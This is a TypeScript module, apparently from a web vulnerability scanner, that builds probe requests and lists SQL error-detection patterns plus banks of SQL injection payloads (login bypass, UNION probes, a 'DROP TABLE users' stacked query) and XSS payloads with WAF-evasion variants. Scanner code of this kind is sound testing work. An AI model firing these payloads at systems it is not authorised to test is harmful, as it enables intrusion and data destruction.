export type PayloadFormat = "URL_PARAM" | "FORM_DATA" | "JSON_BODY" | "GRAPHQL_VAR";

export interface PayloadTarget {
  url: string;
  method: "GET" | "POST" | "PUT" | "PATCH";
  parameter: string;
  format: PayloadFormat;
  payload: string;
  headers?: Record<string, string>;
  body?: string;
}

/**
 * Builds HTTP request configurations for a probe payload in URL query, Form-data, JSON body, or GraphQL.
 */
export function buildPayloadTarget(
  targetUrl: string,
  method: "GET" | "POST" | "PUT" | "PATCH",
  paramName: string,
  payload: string,
  format: PayloadFormat,
  existingFields: string[] = [paramName]
): { fetchUrl: string; options: RequestInit } {
  const headers: Record<string, string> = {};

  if (format === "URL_PARAM" || method === "GET") {
    const u = new URL(targetUrl);
    u.searchParams.set(paramName, payload);
    return {
      fetchUrl: u.toString(),
      options: { method: "GET", headers },
    };
  }

  if (format === "FORM_DATA") {
    headers["Content-Type"] = "application/x-www-form-urlencoded";
    const bodyParams = new URLSearchParams();
    for (const f of existingFields) {
      bodyParams.set(f, f === paramName ? payload : "test_value");
    }
    return {
      fetchUrl: targetUrl,
      options: { method, headers, body: bodyParams.toString() },
    };
  }

  if (format === "JSON_BODY") {
    headers["Content-Type"] = "application/json";
    const bodyObj: Record<string, any> = {};
    for (const f of existingFields) {
      bodyObj[f] = f === paramName ? payload : "test_value";
    }
    return {
      fetchUrl: targetUrl,
      options: { method, headers, body: JSON.stringify(bodyObj) },
    };
  }

  if (format === "GRAPHQL_VAR") {
    headers["Content-Type"] = "application/json";
    const graphqlPayload = {
      query: `query ProbeQuery($${paramName}: String) { search(${paramName}: $${paramName}) { id } }`,
      variables: { [paramName]: payload },
    };
    return {
      fetchUrl: targetUrl,
      options: { method: "POST", headers, body: JSON.stringify(graphqlPayload) },
    };
  }

  // Fallback GET
  const u = new URL(targetUrl);
  u.searchParams.set(paramName, payload);
  return { fetchUrl: u.toString(), options: { method: "GET", headers } };
}

export const SQL_ERROR_PATTERNS_ACTIVE = [
  /SQL syntax.*MySQL/i, /Warning.*mysql_/i, /MySQLSyntaxErrorException/i,
  /PostgreSQL.*ERROR/i, /PSQLException/i, /ORA-\d{4,}/i,
  /Microsoft OLE DB.*SQL Server/i, /Unclosed quotation mark/i,
  /SQLiteException/i, /You have an error in your SQL syntax/i,
  /ODBC SQL Server Driver/i, /Syntax error.*in query expression/i,
  /pg_query|pg_exec|sqlite_query|mssql_query/i,
  /supplied argument is not a valid MySQL/i,
  /Column count doesn't match value count/i,
  /quoted string not properly terminated/i,
  // SQLite + Sequelize (used by OWASP Juice Shop)
  /SQLITE_ERROR/i, /sqlite3\.DatabaseError/i,
  /SequelizeDatabaseError/i, /near \".*\": syntax error/i,
  /SQLITE_CONSTRAINT/i, /unrecognized token/i,
];

// Multiple SQLi payloads: error-based, boolean-based, UNION-based, and nested parenthesis break-outs
export const SQLI_PAYLOADS = [
  "'",                           // basic single quote — triggers syntax errors
  "'--",                         // comment out rest of query
  "' OR '1'='1",                 // boolean always-true
  "' OR '1'='1'--",              // boolean with comment
  "1' AND 1=1--",                // numeric context boolean
  "')) OR 1=1--",                // nested double parenthesis (SQLite / Juice Shop search query break-out)
  "'))--",                       // nested double parenthesis comment
  "') OR ('1'='1",               // single parenthesis OR
  "' UNION SELECT NULL--",       // UNION-based (1 column)
  "' UNION SELECT NULL,NULL--",  // UNION-based (2 columns)
  "; DROP TABLE users--",        // stacked query (rare but detectable)
  "' OR 1=1--",                  // numeric boolean variant
  "admin'--",                    // admin bypass
];

// XSS payloads: base bank with WAF-evasion variants.
export const XSS_PAYLOADS = [
  // ── Minimal tag markers (lowest WAF signature risk) ──────────────────────
  "<vulnscanXSStag>",
  "<VULNSCANXSSTAG>",                                          // mixed-case bypass
  // ── Script injection ─────────────────────────────────────────────────────
  "<script>/*vulnscan*/</script>",
  "<Script>/*vulnscan*/</Script>",                             // mixed-case evasion
  // ── Attribute break-out ───────────────────────────────────────────────────
  `"><img src=x onerror=alert('vulnscan')>`,
  `"><IMG SRC=x ONERROR=alert('vulnscan')>`,                   // upper-case attrs
  `"><img src=x onerror=alert\`vulnscan\`>`,                   // template-literal call
  `" onmouseover="alert('vulnscan')"`,
  `" onfocus="alert('vulnscan')" autofocus="`,
  // ── JS context break-out ─────────────────────────────────────────────────
  `';alert('vulnscan');//`,
  `\`;alert('vulnscan');//`,                                   // back-tick quote
  // ── SVG / namespace tricks ────────────────────────────────────────────────
  `<svg onload=alert(1)>`,
  `<svg/onload=alert(1)>`,                                     // no-space evasion
  `<svg><script>alert(1)</script></svg>`,
  // ── HTML entity / Unicode encoding ───────────────────────────────────────
  `<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>`,    // HTML hex entities
  `%3Cscript%3Ealert(1)%3C/script%3E`,                        // URL-encoded
  // ── Protocol-based ───────────────────────────────────────────────────────
  `javascript:alert('vulnscan')`,
  `JaVaScRiPt:alert('vulnscan')`,                              // mixed-case protocol
  // ── onerror / title handler ──────────────────────────────────────────────
  `<img src="" onerror="document.title='VULNSCAN'">`,
  // ── HTML5 event ──────────────────────────────────────────────────────────
  `<details open ontoggle=alert(1)>`,
  // ── Polyglot (fires in HTML, attr, JS and URL contexts) ──────────────────
  `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\'`,
];

